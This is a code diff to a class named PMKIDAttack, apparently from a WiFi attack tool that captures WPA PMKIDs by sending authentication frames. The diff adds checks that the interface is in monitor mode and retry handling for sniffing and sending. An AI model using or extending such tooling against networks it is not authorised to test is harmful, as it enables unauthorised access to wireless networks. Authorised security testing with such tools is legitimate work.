@@ -82,6 +82,44 @@ class PMKIDAttack:
                    random.randint(0x00, 0xff)]
             return ':'.join('%02x' % b for b in mac)
 
+    def _wait_for_interface(self, retries=5, delay=1):
+        """Wait until the monitor interface is ready for use."""
+        import subprocess
+        for i in range(retries):
+            try:
+                result = subprocess.run(
+                    ["iwconfig", self.interface],
+                    capture_output=True, text=True, timeout=5
+                )
+                if "Mode:Monitor" in result.stdout:
+                    return True
+            except (subprocess.TimeoutExpired, FileNotFoundError):
+                pass
+            if i < retries - 1:
+                time.sleep(delay)
+        print_warning(f"Interface {self.interface} may not be fully ready.")
+        return False
+
+    def _sniff_worker(self, timeout):
+        """Sniff for PMKID packets with retry on interface errors."""
+        retries = 3
+        for attempt in range(retries):
+            try:
+                sniff(
+                    iface=self.interface,
+                    prn=self._packet_handler,
+                    timeout=timeout,
+                    store=False,
+                    stop_filter=lambda _: self._stop_event.is_set()
+                )
+                return
+            except OSError as e:
+                if attempt < retries - 1 and not self._stop_event.is_set():
+                    print_warning(f"Sniff error: {e} - retrying in 2s...")
+                    time.sleep(2)
+                else:
+                    print_error(f"Interface error: {e}")
+
     def _build_auth_request(self):
         """Build an authentication request frame."""
         return (
@@ -230,21 +268,19 @@ class PMKIDAttack:
         print()
         print_info("Sending authentication/association requests...")
 
+        # Wait for interface to be fully ready before sniffing
+        self._wait_for_interface()
+
         # Start sniffing in background
         sniff_thread = threading.Thread(
-            target=lambda: sniff(
-                iface=self.interface,
-                prn=self._packet_handler,
-                timeout=timeout,
-                store=False,
-                stop_filter=lambda _: self._stop_event.is_set()
-            ),
+            target=self._sniff_worker,
+            args=(timeout,),
             daemon=True
         )
         sniff_thread.start()
 
         # Give sniffer time to start
-        time.sleep(0.5)
+        time.sleep(1)
 
         # Send auth + assoc requests in bursts
         auth_pkt = self._build_auth_request()
@@ -265,8 +301,10 @@ class PMKIDAttack:
                     print(f"  Attempts: {attempts}", end="\r")
 
             except OSError as e:
-                print_error(f"Send error: {e}")
-                break
+                # Interface may not be ready yet, wait and retry
+                print_warning(f"Send error: {e} - retrying in 2s...")
+                time.sleep(2)
+                continue
 
             self._stop_event.wait(2)
 
